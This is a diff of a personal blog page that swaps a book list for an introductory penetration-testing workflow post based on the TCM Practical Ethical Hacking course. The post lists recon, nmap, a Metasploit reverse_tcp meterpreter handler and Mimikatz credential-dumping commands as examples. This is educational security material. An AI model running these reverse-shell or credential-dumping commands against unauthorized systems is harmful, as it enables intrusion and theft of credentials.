@@ -21,7 +21,7 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Resources &middot; Joshua Krizek</title>
+    <title>Peh &middot; Joshua Krizek</title>
     <meta name="description" content="" />
 
     
@@ -213,10 +213,10 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
             <div class="post">
   <div class="info">
     <h1 class="post-title">
-        <a href="https://joshuakrizek.com/resources/resources/">Resources</a>
+        <a href="https://joshuakrizek.com/posts/peh/">Peh</a>
     </h1>
-    <time datetime="2023-01-14T21:16:41-0700" class="post-date">
-        January 14, 2023
+    <time datetime="2025-07-12T10:48:46-0600" class="post-date">
+        July 12, 2025
     </time>
     
     
@@ -226,30 +226,87 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
     
 </div>
 
-  <h1 id="books">Books:</h1>
-<p>Ghost in the Wire</p>
-<p>Art of Invisibility</p>
-<p>Spies Among Us (The book that started my journey)</p>
-<p>Countdown to zero Day</p>
-<p>More coming at some point&hellip;</p>
+  <h1 id="practical-ethical-hacking-pentesting-framework">Practical Ethical Hacking: Pentesting Framework</h1>
+<p>Welcome to this TCM PEH pentesting framework! Let’s dive in!</p>
+<hr>
+<h2 id="high-level-pentesting-workflow">High-Level Pentesting Workflow</h2>
+<ol>
+<li><strong>Preparation</strong>: Understand the scope, goals, and rules of engagement.</li>
+<li><strong>Information Gathering (Reconnaissance)</strong>: Research your target to gather as much information as possible.</li>
+<li><strong>Scanning &amp; Enumeration</strong>: Actively probe the target to identify vulnerabilities and services.</li>
+<li><strong>Exploitation</strong>: Use your findings to exploit vulnerabilities and gain access.</li>
+<li><strong>Post-Exploitation</strong>: Maintain access, gather data, and document your findings.</li>
+<li><strong>Reporting</strong>: Share your results in a clear and actionable way.</li>
+</ol>
+<hr>
+<h2 id="step-by-step-breakdown">Step-by-Step Breakdown</h2>
+<h3 id="1-information-gathering-reconnaissance">1. Information Gathering (Reconnaissance)</h3>
+<p>Recon is all about learning about your target without interacting with it directly. Use OSINT (Open Source Intelligence) tools like <code>theHarvester</code> or Google Dorks to scrape information from public sources. Look for employee names, email addresses, domain registrations, and more.</p>
+<p>Here&rsquo;s a quick example of using <code>theHarvester</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theHarvester -d targetdomain.com -b google
+</span></span></code></pre></div><h3 id="2-scanning--enumeration">2. Scanning &amp; Enumeration</h3>
+<p>This is where you start interacting with the target. Use tools like <code>Nmap</code> to scan for open ports, services, and versions.</p>
+<p>Example of an Nmap scan command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV -A -T4 targetdomain.com
+</span></span></code></pre></div><p>Enumeration goes a step further by gathering details about the services and systems found. This might involve querying DNS, SMB enumeration, or service-specific tools like <code>Nikto</code> for web servers.</p>
+<h3 id="3-exploitation-basics">3. Exploitation Basics</h3>
+<p>Now it’s time to put the pieces together and exploit vulnerabilities. Start simple: try default credentials or misconfigurations. Then, move to more advanced techniques like custom scripts or tools like <code>Metasploit</code>.</p>
+<p>Basic Metasploit example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set LHOST your_IP
+</span></span><span style="display:flex;"><span>set LPORT your_Port
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>Remember, always verify your exploit doesn’t cause unintended harm!</p>
+<h3 id="4-post-exploitation">4. Post-Exploitation</h3>
+<p>Once you gain access, focus on maintaining control and gathering additional information. Tools like <code>Mimikatz</code> can help extract credentials, and you can pivot to other systems using compromised credentials.</p>
+<p>Example Mimikatz usage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz
+</span></span><span style="display:flex;"><span>privilege::debug
+</span></span><span style="display:flex;"><span>sekurlsa::logonpasswords
+</span></span></code></pre></div><p>Document everything you find, as this will be critical for your report.</p>
+<h3 id="5-reporting">5. Reporting</h3>
+<p>The final step is to compile your findings into a clear, actionable report. Highlight critical vulnerabilities, explain their impact, and provide detailed remediation steps.</p>
+<hr>
+<h2 id="tools-overview">Tools Overview</h2>
+<p>Here’s a quick recap of essential tools you’ll use:</p>
+<ul>
+<li><strong>OSINT</strong>: <code>theHarvester</code>, Google Dorks</li>
+<li><strong>Scanning</strong>: <code>Nmap</code>, <code>Nikto</code></li>
+<li><strong>Exploitation</strong>: <code>Metasploit</code>, Custom Scripts</li>
+<li><strong>Post-Exploitation</strong>: <code>Mimikatz</code>, Pivoting Techniques</li>
+</ul>
 
   <hr>
 <div class="footer">
     
 	    
             
-	            <a class="previous-post" href="https://joshuakrizek.com/posts/1-24-2022-post/?ref=footer">« Interesting hacking attempt</a>
+	            <a class="previous-post" href="https://joshuakrizek.com/posts/fox/?ref=footer">« How to setup foxyproxy for burpsuite</a>
 	        
         
 	    
-            
-        
     
 </div>
 
   <div class="article-toc " >
     <h4></h4>
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#high-level-pentesting-workflow">High-Level Pentesting Workflow</a></li>
+    <li><a href="#step-by-step-breakdown">Step-by-Step Breakdown</a>
+      <ul>
+        <li><a href="#1-information-gathering-reconnaissance">1. Information Gathering (Reconnaissance)</a></li>
+        <li><a href="#2-scanning--enumeration">2. Scanning &amp; Enumeration</a></li>
+        <li><a href="#3-exploitation-basics">3. Exploitation Basics</a></li>
+        <li><a href="#4-post-exploitation">4. Post-Exploitation</a></li>
+        <li><a href="#5-reporting">5. Reporting</a></li>
+      </ul>
+    </li>
+    <li><a href="#tools-overview">Tools Overview</a></li>
+  </ul>
+</nav>
 </div>
 
 </div>
